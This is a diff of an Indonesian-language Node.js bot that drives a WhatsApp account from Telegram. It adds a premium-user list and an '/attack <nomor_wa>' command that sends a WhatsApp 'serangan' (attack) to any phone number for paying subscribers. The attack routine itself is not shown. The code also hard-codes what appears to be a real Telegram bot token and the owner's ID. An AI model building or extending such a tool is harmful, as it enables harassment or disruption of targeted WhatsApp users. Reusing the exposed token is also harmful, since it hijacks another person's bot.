@@ -1,29 +1,34 @@
 // =================================================================
-// KODE REMAKE TOTAL - DIBUAT UNTUK KUNU
+// KODE REMAKE TOTAL - FINAL UNTUK KUNUN
 // =================================================================
 
+// --- Bagian Import Library ---
 const { Telegraf, Markup } = require('telegraf');
 const { makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const fs = require('fs');
 
-// === KONFIGURASI UTAMA (UBAH SEMUA DI SINI) ===
+// === KONFIGURASI UTAMA (SUDAH DIISI SESUAI DATA ANDA) ===
 const CONFIG = {
     TELEGRAM_BOT_TOKEN: '8139581146:AAHP0gukOYBVrgC7iX2FfjP9DODUP9O-qjU',
     OWNER_TELEGRAM_ID: '7046416688',
     OWNER_NAME: 'Kunun',
     BOT_NAME: 'Kunun-Bot',
-    OWNER_TELEGRAM_USERNAME: '@Kenanrp123', // Tanpa @
-    GAMBAR_MENU_URL: 'https://thumbor.prod.vidiocdn.com/IEO56idpTodiN--Pb7O3R1sni3Q=/250x250/filters:quality(70)/vidio-web-prod-channel/uploads/channel/image/54165/lucu-tapi-ketawa-e6c959.jpg', // Ganti dengan URL gambar Anda
-    PREMIUM_DB_FILE: './kunu_premium_users.json'
+    OWNER_TELEGRAM_USERNAME: 'Kenanrp123', // Tanpa @
+    GAMBAR_MENU_URL: 'https://thumbor.prod.vidiocdn.com/IEO56idpTodiN--Pb7O3R1sni3Q=/250x250/filters:quality(70)/vidio-web-prod-channel/uploads/channel/image/54165/lucu-tapi-ketawa-e6c959.jpg',
+    PREMIUM_DB_FILE: './kunun_premium_users.json'
 };
 // =================================================
 
 // --- Database Sederhana untuk User Premium ---
 let premiumUsers = new Set();
 if (fs.existsSync(CONFIG.PREMIUM_DB_FILE)) {
-    const data = JSON.parse(fs.readFileSync(CONFIG.PREMIUM_DB_FILE));
-    premiumUsers = new Set(data);
+    try {
+        const data = JSON.parse(fs.readFileSync(CONFIG.PREMIUM_DB_FILE));
+        premiumUsers = new Set(data);
+    } catch (e) {
+        console.log('File premium_users.json rusak, memulai dengan daftar kosong.');
+    }
 }
 const savePremiumUsers = () => {
     fs.writeFileSync(CONFIG.PREMIUM_DB_FILE, JSON.stringify([...premiumUsers]));
@@ -44,6 +49,7 @@ async function connectToWhatsApp() {
     });
 
     if (!waClient.authState.creds.registered) {
+        console.log("Tidak ada session, silakan gunakan Pairing Code.");
         const readline = require("readline").createInterface({ input: process.stdin, output: process.stdout });
         const question = (text) => new Promise((resolve) => readline.question(text, resolve));
         try {
@@ -58,16 +64,18 @@ async function connectToWhatsApp() {
     }
 
     waClient.ev.on('connection.update', (update) => {
-        if (update.connection === 'open') {
-            console.log('Berhasil terhubung ke WhatsApp!');
-            teleBot.telegram.sendMessage(CONFIG.OWNER_TELEGRAM_ID, `✅ **${CONFIG.BOT_NAME} Terhubung!**\n\nBot WhatsApp berhasil terhubung dan siap menerima perintah dari Telegram.`, { parse_mode: 'Markdown' });
-        } else if (update.connection === 'close') {
-            if (update.lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
-                console.log('Koneksi WA terputus, mencoba menghubungkan kembali...');
+        const { connection, lastDisconnect } = update;
+        if (connection === 'close') {
+            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
+            console.log('Koneksi WhatsApp terputus, mencoba menghubungkan kembali:', shouldReconnect);
+            if (shouldReconnect) {
                 connectToWhatsApp();
             } else {
-                console.log('Koneksi terputus permanen. Hapus folder `kunu_wa_session` dan restart.');
+                console.log('Koneksi terputus permanen. Hapus folder kunu_wa_session dan restart.');
             }
+        } else if (connection === 'open') {
+            console.log('Berhasil terhubung ke WhatsApp!');
+            teleBot.telegram.sendMessage(CONFIG.OWNER_TELEGRAM_ID, `✅ **${CONFIG.BOT_NAME} Terhubung!**\n\nBot WhatsApp berhasil terhubung dan siap menerima perintah dari Telegram.`, { parse_mode: 'Markdown' });
         }
     });
     waClient.ev.on('creds.update', saveCreds);
@@ -89,3 +97,83 @@ const isPremium = (ctx) => premiumUsers.has(ctx.from.id.toString()) || isOwner(c
 const menuUtama = (ctx) => {
     const uptime = new Date(process.uptime() * 1000).toISOString().substr(11, 8);
     const menuText = `
+╭─「 **${CONFIG.BOT_NAME}** 」
+│- Developed by **${CONFIG.OWNER_NAME}**
+│- Runtime: ${uptime}
+│- Status WA: ${waClient && waClient.user ? 'Terhubung' : 'Terputus'}
+╰───────────────────
+
+👑 *MENU OWNER*
+- \`/addprem <user_id>\`
+- \`/delprem <user_id>\`
+- \`/listprem\`
+
+💥 *MENU ATTACK (Premium)*
+- \`/attack <nomor_wa>\`
+
+ℹ️ *INFO*
+- \`/status\` - Cek status bot
+- \`/myid\` - Cek ID Telegram Anda
+    `;
+    ctx.replyWithPhoto(CONFIG.GAMBAR_MENU_URL, {
+        caption: menuText,
+        parse_mode: 'Markdown',
+        ...Markup.inlineKeyboard([
+            [Markup.button.url(`Hubungi ${CONFIG.OWNER_NAME}`, `https://t.me/${CONFIG.OWNER_TELEGRAM_USERNAME}`)]
+        ])
+    });
+};
+
+// --- Perintah-perintah Telegram ---
+teleBot.start(menuUtama);
+teleBot.command('menu', menuUtama);
+teleBot.command('myid', (ctx) => ctx.reply(`ID Telegram Anda adalah: \`${ctx.from.id}\``, { parse_mode: 'Markdown' }));
+teleBot.command('status', menuUtama);
+
+// Perintah Owner
+teleBot.command('addprem', (ctx) => {
+    if (!isOwner(ctx)) return ctx.reply('⛔ Perintah ini hanya untuk Owner.');
+    const userId = ctx.message.text.split(' ')[1];
+    if (!userId) return ctx.reply('Gunakan: /addprem <user_id>');
+    premiumUsers.add(userId);
+    savePremiumUsers();
+    ctx.reply(`✅ User ID \`${userId}\` berhasil ditambahkan sebagai premium.`, { parse_mode: 'Markdown' });
+});
+
+teleBot.command('delprem', (ctx) => {
+    if (!isOwner(ctx)) return ctx.reply('⛔ Perintah ini hanya untuk Owner.');
+    const userId = ctx.message.text.split(' ')[1];
+    if (!userId) return ctx.reply('Gunakan: /delprem <user_id>');
+    premiumUsers.delete(userId);
+    savePremiumUsers();
+    ctx.reply(`🗑️ User ID \`${userId}\` berhasil dihapus dari premium.`, { parse_mode: 'Markdown' });
+});
+
+teleBot.command('listprem', (ctx) => {
+    if (!isOwner(ctx)) return ctx.reply('⛔ Perintah ini hanya untuk Owner.');
+    const count = premiumUsers.size;
+    let list = `Daftar User Premium (${count}):\n`;
+    premiumUsers.forEach(id => list += `- \`${id}\`\n`);
+    ctx.reply(list || 'Tidak ada user premium.', { parse_mode: 'Markdown' });
+});
+
+// Perintah Attack (Hanya Premium)
+teleBot.command('attack', async (ctx) => {
+    if (!isPremium(ctx)) {
+        return ctx.reply(`❌ Anda bukan pengguna premium.\n\nSilakan hubungi @${CONFIG.OWNER_TELEGRAM_USERNAME} untuk berlangganan.`);
+    }
+    const nomor = ctx.message.text.split(' ')[1];
+    if (!nomor) return ctx.reply('Gunakan: /attack <nomor_wa>');
+    try {
+        await ctx.reply(`🚀 Mengirim serangan ke ${nomor}...`);
+        await kirimSeranganWA(nomor);
+        await ctx.reply(`✅ Serangan berhasil dikirim ke ${nomor}!`);
+    } catch (e) {
+        await ctx.reply(`❌ Gagal: ${e.message}`);
+    }
+});
+
+// --- Menjalankan Semuanya ---
+connectToWhatsApp();
+teleBot.launch();
+console.log(`Bot Hybrid ${CONFIG.BOT_NAME} by ${CONFIG.OWNER_NAME} sedang berjalan...`);
